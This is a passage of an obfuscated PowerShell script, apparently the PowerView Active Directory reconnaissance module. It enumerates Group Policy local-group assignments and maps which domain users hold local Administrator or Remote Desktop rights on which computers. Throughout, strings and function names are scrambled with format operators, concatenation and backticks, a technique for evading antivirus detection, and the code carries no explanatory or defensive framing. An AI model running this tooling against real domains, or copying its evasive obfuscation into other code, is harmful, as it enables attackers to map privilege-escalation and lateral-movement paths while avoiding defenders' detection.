                                if (  $Member -notmatch ("{0}{1}"-f'^S-1-.','*' ) ) {
                                    $ConvertToArguments = @{(  "{0}{1}{2}"-f'Objec','tN','ame' )  =  $Member}
                                    if ( $PSBoundParameters[("{1}{0}"-f 'main','Do')] ) { $ConvertToArguments[( "{0}{2}{1}"-f'D','main','o')] = $Domain }
                                    $MemberSID =   ConvertTo-SID @ConvertToArguments

                                    if (  $MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue   =  $GroupMembers
                    }

                    if ( -not $Memberships[$Group] ) {
                        $Memberships[$Group]  =   @{}
                    }
                    if (  $MembershipValue -isnot [System.Array]  ) {$MembershipValue  =  @($MembershipValue )}
                    $Memberships[$Group].ADd( $Relation, $MembershipValue)
                }

                ForEach ($Membership in $Memberships.GEtEnumERaTor(  )) {
                    if ($Membership -and $Membership.keY -and ($Membership.KEy -match '^\*'  )  ) {
                        
                        $GroupSID  =  $Membership.Key.trim(  '*'  )
                        if ($GroupSID -and ($GroupSID.TrIM(  ) -ne ''  )) {
                            $GroupName   = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName  = $False
                        }
                    }
                    else {
                        $GroupName =  $Membership.keY

                        if (  $GroupName -and ( $GroupName.TrIm(   ) -ne ''  )) {
                            if (  $Groupname -match ("{0}{1}{4}{2}{3}" -f 'Admin','is','rator','s','t' ) ) {
                                $GroupSID   =  ("{1}{0}{2}{3}" -f '-','S','1-5-32-5','44' )
                            }
                            elseif ( $Groupname -match ( "{1}{0}{3}{2}" -f 'kt','Remote Des','p','o') ) {
                                $GroupSID = (  "{0}{2}{1}"-f 'S-1','5-32-555','-')
                            }
                            elseif ($Groupname -match (  "{1}{0}"-f'sts','Gue'  )  ) {
                                $GroupSID  = (  "{2}{0}{1}" -f '-1-5-32','-546','S'  )
                            }
                            elseif ($GroupName.trIM( ) -ne '') {
                                $ConvertToArguments  =  @{("{0}{2}{1}{3}"-f 'Obje','tN','c','ame')  =   $Groupname}
                                if ( $PSBoundParameters[("{1}{2}{0}" -f'ain','Do','m' )]) { $ConvertToArguments[(  "{0}{1}" -f'Dom','ain' )] = $Domain }
                                $GroupSID   =  ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $GroupSID =   $Null
                            }
                        }
                    }

                    $GPOGroup  = New-Object (  'PS'  +'Obje' + 'ct')
                    $GPOGroup |  Add-Member (  'Not' +'ep'  + 'roperty') ( "{3}{1}{2}{0}" -f'e','ispla','yNam','GPOD') $GPODisplayName
                    $GPOGroup |  Add-Member ( 'Not'  +'ep'  +'ropert'+  'y') (  "{2}{0}{1}" -f 'ONa','me','GP'  ) $GPOName
                    $GPOGroup  |  Add-Member ( 'Note'  +'p'+  'roper' +'ty'  ) (  "{2}{0}{1}"-f 'OPa','th','GP' ) $GPOPath
                    $GPOGroup  |  Add-Member ('Notep'  +  'r' + 'ope' + 'rty' ) (  "{1}{2}{0}"-f 'pe','GP','OTy'  ) ("{1}{0}{3}{2}" -f 'i','Restr','Groups','cted' )
                    $GPOGroup   |   Add-Member (  'No'+ 'tepro'  +  'perty'  ) (  "{0}{1}" -f'Filte','rs' ) $Null
                    $GPOGroup   |   Add-Member ('N'  + 'o'  + 'tepr'+ 'operty') (  "{2}{0}{1}" -f'pNa','me','Grou' ) $GroupName
                    $GPOGroup  |   Add-Member ( 'N'  + 'oteproper'  +  'ty'  ) ("{1}{0}" -f 'upSID','Gro') $GroupSID
                    $GPOGroup  |  Add-Member (  'No'  + 'tepr'+  'ope'+ 'rty'  ) (  "{1}{3}{0}{2}" -f'b','GroupM','erOf','em') $Membership.VAluE.MEmbErof
                    $GPOGroup |  Add-Member ( 'Notep' + 'rop' +'erty' ) ( "{0}{1}{2}" -f 'Gro','upM','embers' ) $Membership.vaLUE.mEMbers
                    $GPOGroup.PSOBject.typENamES.INseRT( 0, (  "{4}{2}{3}{1}{0}"-f'oup','GPOGr','e','rView.','Pow'  ) )
                    $GPOGroup
                }
            }

            
            $ParseArgs =   @{
                ("{1}{0}{3}{2}"-f 'roupsXM','G','path','L')  =  "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            Get-GroupsXML @ParseArgs   |  ForEach-Object {
                if ($PSBoundParameters[(  "{5}{1}{3}{2}{0}{4}{6}"-f'm','eso','eMe','lv','bersT','R','oSIDs'  )]  ) {
                    $GroupMembers =  @( )
                    ForEach (  $Member in $_.GRoUPmEMBErS ) {
                        if ( $Member -and (  $Member.trIM() -ne ''  )) {
                            if (  $Member -notmatch ("{1}{0}{2}" -f'-1','^S','-.*')) {

                                
                                $ConvertToArguments  =  @{(  "{0}{1}{2}"-f'Ob','j','ectName' )  =  $Groupname}
                                if ($PSBoundParameters[("{1}{0}"-f'ain','Dom')] ) { $ConvertToArguments[(  "{0}{1}" -f 'Do','main' )]  = $Domain }
                                $MemberSID   = ConvertTo-SID -Domain $Domain -ObjectName $Member

                                if (  $MemberSID ) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.gROupmeMbeRS  =   $GroupMembers
                }

                $_ |  Add-Member ('Notepro'+  'pert'+ 'y'  ) (  "{2}{3}{0}{4}{1}"-f'ayNa','e','GP','ODispl','m' ) $GPODisplayName
                $_  |   Add-Member ('N'  +'oteprop'  +'e'+  'rty' ) (  "{2}{1}{0}"-f 'me','ONa','GP'  ) $GPOName
                $_  |   Add-Member ('No' +'tepr'+'operty' ) ("{0}{1}" -f 'GP','OType') ("{2}{1}{4}{6}{3}{0}{5}"-f'efere','li','GroupPo','r','c','nces','yP' )
                $_.PSObJeCt.TypeNaMEs.iNsErT(  0, ( "{0}{3}{5}{2}{4}{1}" -f 'P','OGroup','.','ow','GP','erView' ))
                $_
            }
        }
    }
}


function G`E`T-DO`MAI`N`GPou`SE`Rloc`AlgROU`pmaPPiNg {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{1}{2}{0}{3}"-f'Proces','PSSho','uld','s'}, '' )]
    [OutputType( {"{1}{4}{0}{3}{5}{2}{6}" -f'ie','P','roupMapp','w.GPOUserLocal','owerV','G','ing'} )]
    [CmdletBinding(  )]
    Param(
        [Parameter(  poSItION   =  0, VALUefROMpIpElIne  =   $True, vAluEFrOmpIpELInebyPRoPERtYNAME  =  $True  )]
        [Alias({"{3}{2}{1}{0}" -f 'hedName','guis','tin','Dis'}, {"{0}{2}{3}{1}"-f'SamAcc','e','ountN','am'}, {"{1}{0}" -f 'me','Na'})]
        [String]
        $Identity,

        [String]
        [ValidateSet(  {"{1}{0}{3}{2}"-f'tra','Adminis','s','tor'}, {"{0}{2}{1}{3}"-f 'S-1-5','5','-32-','44'}, 'RDP', {"{4}{3}{0}{1}{2}"-f'sk','top U','sers',' De','Remote'}, {"{0}{2}{3}{1}" -f'S-','-555','1-5-','32'})]
        $LocalGroup = ("{2}{0}{1}"-f 'dministra','tors','A'),

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{0}{1}" -f 'ADSPa','th'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{3}{4}{1}{0}{2}"-f 'l','rol','er','DomainC','ont'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{1}{0}"-f 'vel','OneLe'}, {"{1}{0}{2}" -f'btre','Su','e'}  )]
        [String]
        $SearchScope  =  ( "{2}{0}{1}" -f 'ubtr','ee','S'  ),

        [ValidateRange(  1, 10000)]
        [Int]
        $ResultPageSize =   200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential   = [Management.Automation.PSCredential]::emPty
      )

    BEGIN {
        $CommonArguments  = @{}
        if ( $PSBoundParameters[( "{1}{0}" -f 'main','Do')]  ) { $CommonArguments[(  "{1}{0}" -f'main','Do' )]  =  $Domain }
        if (  $PSBoundParameters[(  "{1}{2}{0}"-f 'r','Serv','e')]  ) { $CommonArguments[(  "{0}{2}{1}"-f 'S','ver','er'  )]   = $Server }
        if ($PSBoundParameters[(  "{2}{1}{3}{0}"-f 'Scope','r','Sea','ch' )]  ) { $CommonArguments[(  "{1}{0}{2}"-f 'earchScop','S','e' )]  =  $SearchScope }
        if (  $PSBoundParameters[("{1}{2}{3}{0}" -f'Size','R','esu','ltPage' )]  ) { $CommonArguments[( "{4}{2}{3}{1}{0}"-f 'ze','i','e','sultPageS','R')] = $ResultPageSize }
        if (  $PSBoundParameters[( "{0}{2}{3}{1}"-f'Serv','imit','er','TimeL' )]  ) { $CommonArguments[("{2}{1}{3}{0}" -f 'mit','rTime','Serve','Li' )]  =   $ServerTimeLimit }
        if ($PSBoundParameters[( "{1}{2}{0}"-f 'tone','Tom','bs')]) { $CommonArguments[("{0}{1}{2}"-f 'To','mbston','e' )]   = $Tombstone }
        if ($PSBoundParameters[("{3}{0}{1}{2}" -f'ed','e','ntial','Cr'  )]) { $CommonArguments[(  "{1}{2}{0}" -f 'al','Crede','nti'  )] =   $Credential }
    }

    PROCESS {
        $TargetSIDs = @( )

        if ( $PSBoundParameters[(  "{1}{2}{0}" -f 'tity','Id','en')]  ) {
            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity  |  Select-Object -Expand ('objec' +'tsid' )
            $TargetObjectSID  = $TargetSIDs
            if (  -not $TargetSIDs  ) {
                Throw ('[Get-DomainGPO'  +  'U' +  'serL'+'oc'  +  'a' +  'lGro'  +  'upM'  +'apping' + '] '  +'U'  +'nab' +'le '  +'t'+  'o '+ 'r'  + 'etri'+ 'eve '+'SI' + 'D ' + 'f'  +  'or '+'ide'  +'ntit' + 'y'+ ' '  +"'$Identity'" )
            }
        }
        else {
            
            $TargetSIDs   =  @('*'  )
        }

        if ( $LocalGroup -match ("{1}{0}" -f'5','S-1-')) {
            $TargetLocalSID   =  $LocalGroup
        }
        elseif (  $LocalGroup -match (  "{1}{0}" -f 'n','Admi'  ) ) {
            $TargetLocalSID   =  ("{1}{0}{2}{3}"-f '5-','S-1-','32-','544' )
        }
        else {
            
            $TargetLocalSID  =   ("{2}{0}{1}{3}"-f'5','-32','S-1-','-555'  )
        }

        if ($TargetSIDs[0] -ne '*' ) {
            ForEach (  $TargetSid in $TargetSids  ) {
                Write-Verbose (  '[G'+'et-Dom'  +'a'+ 'inGP'  + 'OUserLocalG'+  'r'  +  'o'  +'u' +  'pMappi' +'ng'  + '] '+  'Enum'  + 'erat' + 'i'+ 'ng '+ 'nest' +'e'  +  'd ' + 'grou'  + 'p ' +'membe'  + 'rshi' + 'ps '  + 'for'+': '  +  "'$TargetSid'")
                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties ( "{2}{0}{1}"-f 'cts','id','obje' ) -MemberIdentity $TargetSid   |   Select-Object -ExpandProperty (  'o'  +'bject' +  'sid' )
            }
        }

        Write-Verbose (  '['+'Get'+'-' + 'Domain' +'GPOUse'+'rLo'  + 'cal'  + 'G' +  'roupMa'  +'pping] '  + 'Targe'+'t '  +'localgr'+ 'oup' +' '  +  'SID' + ': '  +  "$TargetLocalSID"  )
        Write-Verbose ('[G'  +  'et-' +  'Do' + 'mai'+  'nG' + 'P'  + 'OUs'+'erLocalG'  + 'roupMap' +  'ping] ' +'Effe'+'ctiv'  + 'e'+ ' ' + 'targe'  + 't '  +'dom'+  'ain '  + 'SID' +  's: ' +"$TargetSIDs"  )

        $GPOgroups  =   Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs   |  ForEach-Object {
            $GPOgroup =   $_
            
            if ( $GPOgroup.GrOupsid -match $TargetLocalSID) {
                $GPOgroup.GroUpmEMBers |   Where-Object {$_}  | ForEach-Object {
                    if (   (  $TargetSIDs[0] -eq '*'  ) -or ( $TargetSIDs -Contains $_  ) ) {
                        $GPOgroup
                    }
                }
            }
            
            if (   ($GPOgroup.grOuPMEmBeROf -contains $TargetLocalSID)  ) {
                if (  (  $TargetSIDs[0] -eq '*'  ) -or (  $TargetSIDs -Contains $GPOgroup.grOUpSiD  )   ) {
                    $GPOgroup
                }
            }
        }   |   Sort-Object -Property (  'GPONam'+  'e'  ) -Unique

        $GPOgroups  |   Where-Object {$_}   | ForEach-Object {
            $GPOname = $_.gpODIsPLaynAMe
            $GPOguid   =  $_.GPonamE
            $GPOPath   = $_.GPoPatH
            $GPOType   =  $_.GPoTYPE
            if (  $_.GRouPMemberS ) {
                $GPOMembers   = $_.gRoupMEMbErs
            }
            else {
                $GPOMembers  =  $_.GRoupsId
            }

            $Filters =  $_.fiLtErs

            if ($TargetSIDs[0] -eq '*') {
                
                $TargetObjectSIDs  =   $GPOMembers
            }
            else {
                $TargetObjectSIDs   =  $TargetObjectSID
            }

            
            Get-DomainOU @CommonArguments -Raw -Properties ("{5}{1}{4}{0}{2}{3}"-f'ng','me','uis','hedname',',disti','na') -GPLink $GPOGuid |   ForEach-Object {
                if ( $Filters ) {
                    $OUComputers   =   Get-DomainComputer @CommonArguments -Properties ("{2}{6}{0}{1}{8}{5}{7}{3}{4}"-f 'h','ostnam','dn','m','e','stinguishe','s','dna','e,di') -SearchBase $_.paTh   |  Where-Object {$_.dIsTiNGuIShEdNAMe -match ($Filters.ValuE )} | Select-Object -ExpandProperty (  'dnsh' +'o'+  'stname')
                }
                else {
                    $OUComputers  = Get-DomainComputer @CommonArguments -Properties (  "{1}{2}{0}" -f 'e','dnsh','ostnam' ) -SearchBase $_.pATh |  Select-Object -ExpandProperty (  'dnsh'  + 'os'+  'tname')
                }

                if (  $OUComputers ) {
                    if ( $OUComputers -isnot [System.Array] ) {$OUComputers   =   @($OUComputers)}

                    ForEach ($TargetSid in $TargetObjectSIDs ) {
                        $Object   =   Get-DomainObject @CommonArguments -Identity $TargetSid -Properties (  "{1}{8}{5}{3}{4}{11}{10}{9}{6}{12}{2}{7}{0}"-f'id','samacco','ject','y','pe,samacc','tt','g','s','un','istin','e,d','ountnam','uishedname,ob'  )

                        $IsGroup = @((  "{2}{0}{1}" -f'6843','5456','2'  ),("{1}{2}{0}" -f'457','2','68435'  ),(  "{0}{1}{2}" -f '536','8709','12'),(  "{2}{0}{1}" -f '0','913','53687')  ) -contains $Object.saMaCCoUnttYpE

                        $GPOLocalGroupMapping  =  New-Object ('PSO'  + 'bje'  +  'ct'  )
                        $GPOLocalGroupMapping |  Add-Member ('N' +  'oteprop' +  'ert'+'y') ("{2}{3}{0}{1}"-f 'am','e','Obj','ectN'  ) $Object.sAMaCcOunTnaME
                        $GPOLocalGroupMapping |  Add-Member ('N' + 'o'+ 'teproperty') (  "{2}{0}{1}"-f 'jectD','N','Ob'  ) $Object.distINguIsheDnaME
                        $GPOLocalGroupMapping |  Add-Member ('Not' + 'e'+ 'pro'  +'perty'  ) ("{1}{2}{0}" -f'SID','Obje','ct' ) $Object.oBjecTsId
                        $GPOLocalGroupMapping   | Add-Member ('Note'  +  'pro' + 'per' +  'ty'  ) ( "{1}{0}" -f 'main','Do' ) $Domain
                        $GPOLocalGroupMapping  | Add-Member ('Note'  +'proper' + 'ty') ( "{0}{2}{1}"-f 'Is','p','Grou' ) $IsGroup
                        $GPOLocalGroupMapping |   Add-Member ('Not' +'epro'  +'perty') ( "{0}{1}{2}{3}"-f'GPO','Dis','play','Name' ) $GPOname
                        $GPOLocalGroupMapping   | Add-Member ( 'Notep'  +'rop'+  'erty' ) (  "{2}{0}{1}"-f 'G','uid','GPO'  ) $GPOGuid
                        $GPOLocalGroupMapping   | Add-Member ('No' +'tepropert' +'y' ) (  "{1}{2}{0}" -f 'th','GP','OPa'  ) $GPOPath
                        $GPOLocalGroupMapping  |   Add-Member ('N'  +'o'  +  'teprope'+ 'rty'  ) (  "{0}{1}{2}"-f'GP','OTyp','e'  ) $GPOType
                        $GPOLocalGroupMapping   | Add-Member (  'Note'  + 'pro'  +'pert'+ 'y'  ) (  "{0}{1}{3}{2}"-f 'C','onta','e','inerNam') $_.PROperTIES.DIsTiNgUiSHeDnaME
                        $GPOLocalGroupMapping  | Add-Member (  'Not' +'ep'  +'r' +  'operty' ) (  "{3}{1}{0}{2}"-f 'm','omputerNa','e','C' ) $OUComputers
                        $GPOLocalGroupMapping.PsOBJect.TYPEnaMES.INSErT( 0, ( "{5}{0}{4}{2}{3}{1}" -f 'r','apping','POLocalGr','oupM','View.G','Powe') )
                        $GPOLocalGroupMapping
                    }
                }
            }

            
            Get-DomainSite @CommonArguments -Properties ("{0}{2}{4}{6}{5}{8}{3}{1}{7}" -f 'site','guished','ob','in','jectb','d','l,','name','ist' ) -GPLink $GPOGuid  | ForEach-Object {
                ForEach (  $TargetSid in $TargetObjectSIDs  ) {
                    $Object =  Get-DomainObject @CommonArguments -Identity $TargetSid -Properties ( "{12}{4}{10}{2}{1}{9}{0}{6}{3}{7}{11}{5}{8}" -f'tname,di',',sama','type','tin','macc','ame,objects','s','guished','id','ccoun','ount','n','sa')

                    $IsGroup  =   @(("{1}{2}{0}" -f'56','26843','54'),("{1}{2}{0}"-f'457','2','68435' ),("{0}{2}{3}{1}"-f '5','2','368','7091' ),(  "{1}{0}{2}"-f '6870','53','913'  )) -contains $Object.saMacCOuntTyPe

                    $GPOLocalGroupMapping = New-Object ( 'PS'+ 'Objec'+  't' )
                    $GPOLocalGroupMapping |  Add-Member (  'No'+  'te'  + 'p' +  'roperty') ( "{0}{1}{2}" -f'ObjectN','am','e' ) $Object.saMacCOuNTNAmE
                    $GPOLocalGroupMapping  | Add-Member (  'Notep' +  'r'  + 'ope'  + 'rty'  ) (  "{2}{0}{1}"-f 'j','ectDN','Ob' ) $Object.DISTINGUIshEDnamE
                    $GPOLocalGroupMapping   |  Add-Member ( 'Note' + 'propert' +'y' ) ( "{1}{0}{2}"-f 'je','Ob','ctSID'  ) $Object.objeCTSiD
                    $GPOLocalGroupMapping  |  Add-Member ( 'Not'+'eprop'+  'er' + 'ty'  ) ("{1}{0}{2}" -f 'Gro','Is','up' ) $IsGroup
                    $GPOLocalGroupMapping | Add-Member ( 'Note'  + 'pr'+'operty'  ) ("{1}{2}{0}"-f 'n','Do','mai' ) $Domain
                    $GPOLocalGroupMapping   |   Add-Member ( 'N'  + 'ote' + 'property' ) ("{2}{1}{3}{0}" -f 'ayName','sp','GPODi','l' ) $GPOname
                    $GPOLocalGroupMapping  |  Add-Member (  'Not'+ 'e'  +'property') (  "{0}{1}"-f 'GPO','Guid'  ) $GPOGuid
                    $GPOLocalGroupMapping   | Add-Member ( 'Not' +  'e'+'property') (  "{1}{0}" -f 'OPath','GP' ) $GPOPath
                    $GPOLocalGroupMapping  |  Add-Member (  'Not'  + 'ep'+ 'ro'  + 'perty') ("{1}{0}"-f 'Type','GPO' ) $GPOType
                    $GPOLocalGroupMapping   | Add-Member ('Note' + 'pro'  +'pe' +  'rty') ("{0}{1}{3}{2}" -f'C','o','Name','ntainer'  ) $_.dIStINguIshedNaMe
                    $GPOLocalGroupMapping   |   Add-Member (  'N'  + 'o'  +'te' +  'property') ( "{0}{2}{1}{3}" -f'C','terNa','ompu','me') $_.SItEObjEctBl
                    $GPOLocalGroupMapping.PsoBjECT.TYPEnAMeS.add((  "{4}{2}{5}{0}{3}{1}" -f'ocalGroupM','ing','rV','app','Powe','iew.GPOL'  ))
                    $GPOLocalGroupMapping
                }
            }
        }
    }
}


function G`Et-D`oMAi`NGpOcomPUTerLOCaLGrou`p`mApPi`NG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{4}{2}{0}{3}" -f'ce','P','uldPro','ss','SSho'}, '' )]
    [OutputType( {"{7}{11}{6}{9}{0}{1}{5}{3}{8}{4}{2}{10}"-f 'mputerLoc','a','e','oupMe','b','lGr','O','PowerVi','m','Co','r','ew.GGP'})]
    [CmdletBinding( deFAuLTPAraMeteRSETNaME  =   {"{3}{1}{0}{2}" -f'tit','uterIden','y','Comp'})]
    Param( 
        [Parameter(pOsiTIon  =   0, paRAMeTerseTnamE   =   "C`o`mPuTerideNtI`TY", MaNDatory  = $True, ValuefroMpipELINE   =   $True, vaLUEfrompIpeLINEBypROperTYName   = $True )]
        [Alias({"{0}{2}{1}" -f 'Compute','e','rNam'}, {"{0}{2}{1}" -f'Comp','ter','u'}, {"{5}{4}{3}{2}{1}{0}"-f'e','am','dN','she','i','Distingu'}, {"{2}{1}{3}{0}" -f 'me','unt','SamAcco','Na'}, {"{0}{1}"-f 'Nam','e'} )]
        [String]
        $ComputerIdentity,

        [Parameter(MaNDaTorY  =   $True, pARAmETeRSETNAMe  = "oUid`E`NtITY" )]
        [Alias( 'OU'  )]
        [String]
        $OUIdentity,

        [String]
        [ValidateSet(  {"{0}{1}{3}{2}" -f'A','dmini','s','strator'}, {"{0}{3}{1}{2}"-f 'S-1-5','2-5','44','-3'}, 'RDP', {"{1}{3}{2}{0}"-f 'Users','Remote D','top ','esk'}, {"{0}{1}{2}"-f'S','-1-','5-32-555'}  )]
        $LocalGroup   = ( "{0}{2}{4}{1}{3}" -f 'A','to','dminis','rs','tra'  ),

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{0}{1}" -f 'A','DSPath'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{3}{1}{0}{2}" -f 'ntroll','mainCo','er','Do'} )]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{1}{0}{2}"-f 'eL','On','evel'}, {"{2}{1}{0}"-f 'e','re','Subt'} )]
        [String]
        $SearchScope  =  (  "{2}{1}{0}" -f'ree','ubt','S' ),

        [ValidateRange(1, 10000  )]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential = [Management.Automation.PSCredential]::EmPtY
    )

    BEGIN {
        $CommonArguments   =  @{}
        if (  $PSBoundParameters[( "{0}{1}"-f'D','omain' )] ) { $CommonArguments[(  "{1}{0}"-f'in','Doma' )]  =   $Domain }
        if ( $PSBoundParameters[( "{1}{0}" -f 'r','Serve')]) { $CommonArguments[( "{0}{1}"-f'Serv','er' )] = $Server }
        if (  $PSBoundParameters[("{1}{0}{2}" -f 'rchScop','Sea','e'  )] ) { $CommonArguments[( "{0}{1}{2}"-f'Se','archScop','e'  )]   = $SearchScope }
        if ($PSBoundParameters[( "{1}{0}{3}{2}"-f'tPa','Resul','e','geSiz'  )] ) { $CommonArguments[(  "{2}{3}{0}{4}{1}"-f 'tPa','e','R','esul','geSiz')]   = $ResultPageSize }
        if (  $PSBoundParameters[( "{1}{0}{2}"-f'erTimeL','Serv','imit')]) { $CommonArguments[(  "{2}{3}{1}{0}" -f 't','TimeLimi','Ser','ver'  )]  =   $ServerTimeLimit }
        if ( $PSBoundParameters[(  "{1}{0}{2}" -f'ombsto','T','ne')]  ) { $CommonArguments[( "{1}{2}{0}" -f 'ne','Tombst','o')]  =   $Tombstone }
        if ($PSBoundParameters[("{0}{1}{2}" -f'C','rede','ntial'  )]) { $CommonArguments[(  "{2}{1}{0}{3}"-f'n','e','Cred','tial'  )] =   $Credential }
    }

    PROCESS {
        if ( $PSBoundParameters[( "{2}{0}{4}{1}{3}" -f 'uterIde','t','Comp','ity','n' )]  ) {
            $Computers =   Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties ( "{3}{2}{5}{0}{1}{4}"-f'na','m','stinguishedname,dns','di','e','host' )

            if (  -not $Computers) {
                throw ( '[Ge' +'t-Domai' + 'nGPO'  +'Compute'+ 'rL'  +'oc'  +  'alGro'  +  'u' +'pMap' +  'ping] ' +'Comp'  + 'u'  +  't' +'er ' +"$ComputerIdentity "+ 'n'  +  'ot '  +  'fou'+ 'nd. '  +  'Tr'+'y '  +'a '+ 'ful'  + 'ly ' +'qual' + 'if'+'ied '  +'host' +' ' +  'n'+  'ame.' )
            }

            ForEach ($Computer in $Computers ) {

                $GPOGuids   = @( )

                
                $DN =   $Computer.dIsTinGuIsHeDNaMe
                $OUIndex   =  $DN.INdExof(  'OU=' )
                if ($OUIndex -gt 0) {
                    $OUName   = $DN.subSTriNg( $OUIndex )
                }
                if ($OUName) {
                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter (  ( "{1}{2}{0}" -f '=*)','(gp','link'))  |   ForEach-Object {
                        Select-String -InputObject $_.gpLink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches   | ForEach-Object {$_.MaTCHes |  Select-Object -ExpandProperty ('Valu' +  'e'  ) }
                    }
                }

                
                Write-Verbose "Enumerating the sitename for: $($Computer.dnshostname) "
                $ComputerSite =   ( Get-NetComputerSiteName -ComputerName $Computer.DNShOstNAMe).SiTENaMe
                if ($ComputerSite -and ( $ComputerSite -notmatch (  "{0}{1}" -f 'E','rror'  ))) {
                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter ("{1}{0}{2}{3}" -f'p','(g','li','nk=*)'  )   |   ForEach-Object {
                        Select-String -InputObject $_.GPLINK -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches  |   ForEach-Object {$_.matCheS  |  Select-Object -ExpandProperty (  'V'  +'alue') }
                    }
                }

                
                $GPOGuids   |   Get-DomainGPOLocalGroup @CommonArguments |   Sort-Object -Property ('GPONa'+ 'me'  ) -Unique |   ForEach-Object {
                    $GPOGroup =  $_

                    if($GPOGroup.GroupMeMbErS) {
                        $GPOMembers  =  $GPOGroup.grOUpMEMberS
                    }
                    else {
                        $GPOMembers   =   $GPOGroup.groUPSid
                    }

                    $GPOMembers  | ForEach-Object {
                        $Object   =   Get-DomainObject @CommonArguments -Identity $_
                        $IsGroup  = @((  "{1}{3}{0}{2}" -f '545','2684','6','3'  ),("{0}{2}{3}{1}"-f '2','457','6843','5'),( "{0}{2}{1}"-f'5','70912','368'),(  "{1}{2}{0}" -f'70913','53','68' )) -contains $Object.sAmaCCOuntTYPe

                        $GPOComputerLocalGroupMember =  New-Object (  'PSOb'+  'j'+  'ect')
                        $GPOComputerLocalGroupMember  | Add-Member ( 'Note'+'prope' +'r'  +  'ty') ( "{2}{0}{3}{1}" -f 'p','erName','Com','ut' ) $Computer.dnShosTNAmE
                        $GPOComputerLocalGroupMember   | Add-Member ('N'  +  'oteprop' + 'er' +'ty' ) (  "{2}{0}{1}"-f'bjectNa','me','O') $Object.sAMAccouNtNAme
                        $GPOComputerLocalGroupMember   | Add-Member ( 'N'  + 'oteprop'+'erty' ) (  "{2}{0}{1}"-f'b','jectDN','O') $Object.dIStinGUIShEDnamE
                        $GPOComputerLocalGroupMember | Add-Member ('Note'+  'pro'  +  'perty' ) ("{1}{2}{0}" -f 'ectSID','Ob','j' ) $_
                        $GPOComputerLocalGroupMember  |   Add-Member ( 'Notep'  +'rop'+'e' +'rty' ) ( "{1}{0}" -f'sGroup','I'  ) $IsGroup
                        $GPOComputerLocalGroupMember | Add-Member ('N'+ 'oteproper'+  't'+'y') ("{3}{1}{2}{0}" -f'e','ispla','yNam','GPOD'  ) $GPOGroup.gPodispLaYnaME
                        $GPOComputerLocalGroupMember  |  Add-Member (  'No'+ 'tep'+  'roper' +  'ty' ) ("{1}{2}{0}"-f'Guid','G','PO') $GPOGroup.GPonamE
                        $GPOComputerLocalGroupMember  | Add-Member ( 'No'+  't'+'eproperty'  ) (  "{1}{0}" -f'Path','GPO' ) $GPOGroup.gPOpATh
                        $GPOComputerLocalGroupMember  |   Add-Member ('Note'  +  'pr'  + 'o'  +'perty') ( "{0}{2}{1}"-f'G','ype','POT' ) $GPOGroup.gpotypE
                        $GPOComputerLocalGroupMember.PsoBjEct.typeNaMeS.ADD(  (  "{8}{0}{7}{10}{2}{1}{5}{9}{4}{6}{3}" -f 'e','ter','u','er','p','Local','Memb','w.G','PowerVi','Grou','POComp'  ) )
                        $GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function G`et-DOma`i`NP`olIC`ydATa {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{4}{1}{2}{0}{3}"-f'dProce','SSho','ul','ss','P'}, '' )]
    [OutputType( [Hashtable]  )]
    [CmdletBinding(   )]
    Param(
        [Parameter( PositIOn =  0, ValUEFRomPIpelInE   =   $True, valuEfRompIpEliNEbyprOpertyNamE  =  $True )]
        [Alias(  {"{1}{2}{0}"-f'ce','Sou','r'}, {"{0}{1}"-f'N','ame'})]
        [String]
        $Policy   = (  "{1}{0}"-f'main','Do'),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(    )]
        [Alias(  {"{0}{3}{2}{1}"-f 'D','ller','ainContro','om'})]
        [String]
        $Server,

        [ValidateRange( 1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential = [Management.Automation.PSCredential]::EmPtY
     )

    BEGIN {
        $SearcherArguments  =   @{}
